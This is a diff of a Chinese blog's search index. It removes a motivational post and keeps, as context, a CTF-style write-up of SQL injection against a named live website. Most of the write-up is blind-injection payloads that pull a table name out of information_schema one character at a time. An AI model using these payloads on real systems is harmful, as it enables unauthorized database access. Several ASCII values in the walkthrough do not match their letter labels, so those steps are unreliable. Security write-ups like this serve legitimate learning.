@@ -12,17 +12,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[致自己和还在努力的人]]></title>
-    <url>%2F2019%2F04%2F25%2F%E6%B5%8B%E8%AF%95%2F</url>
-    <content type="text"><![CDATA[曾经的我 曾经的我和大多数一样，也为梦想奋斗过，曾经的我并不热爱信息专业，因为我是一个体育生，对运动很是痴迷，但也是机缘巧合让我入了网络安全，让我接触到原来计算机之中还有这么有趣的专业，从此入了坑，听起来很荒谬，但现实的乐趣就是随机性，从此我也就踏上了网安这条坑路。。。。 未来 不知道什么时候变得异常的现实主义，对未来有着莫名的恐惧，我想所有人都是这样，以后到底会不会顺着自己的想法去发展，未来会怎么样，这些种子都埋在每个人的心中，一脸的无所谓，其实慌得一批，还是要试着走走看看，如果不适合我也不会死扛，终究有放弃的那天… 忠告 现在可能很累但是是暂时的，痛只有两种，长痛和短痛，不要相信鸡汤，那些和自我安慰没什么两样，什么用也没有只会越来越乱，现实就是现实不是做梦，既然年轻就去拼一把，也不会失去什么，努力和回报不成正比，请记住，996制度只是资本主义吃人的样子，不是什么努力拼搏的理由，不要为了一些没用的琐事换来一生的后悔，学习使人进步，读书不是读死书，只有学习才是是途径，要做的提升自己，而不是按照书本“照搬”，将青春奉献给自己认为不会后悔的事情，不要为了虚度而去放弃机会，珍惜你所做出的选择，不要让社会吞噬了自己。]]></content>
-      <categories>
-        <category>入坑</category>
-      </categories>
-      <tags>
-        <tag>入坑</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[WEB实战注入]]></title>
     <url>%2F2019%2F04%2F09%2FWEB%E8%BF%9B%E9%98%B6-%E5%AE%9E%E6%88%982%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[Neko’s blogWEB进阶-实战2注入链接：http://www.kabelindo.co.id 要求是表的最后一个是flag值 就是一个网站 对这个网站进行注入方法：1.SQLMAP直接跑得到flag值 2.手工注入这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。 上百度查询使用数字型注和盲注，直接转载大牛文章 盲注 id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23 发现有二十二个表 所以 需要 爆出第二十二个表 接着就按着 盲注一步一步来 （第一个字母，到最后一个字母） 12345678910111213141516171819 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),1,1))=116%23 t and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),2,1))=98%23 b and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),3,1))=110%23 n and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),4,1))=111%23 o and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),5,1))=116%23 m and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),6,1))=116%23 a and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),7,1))=116%23 x到了第八位发现为0，空格 即就是只有七位，终于报完了。。。。。类似 and ascii(substr((select table_name from information_schema.tables where table_schema='u9897uwx_kabel' limit 21,1),8,1))=0%23经过我的一步一步测试，终于爆出表明 为 tbnomax 最后输入 flag{tbnomax}]]></content>
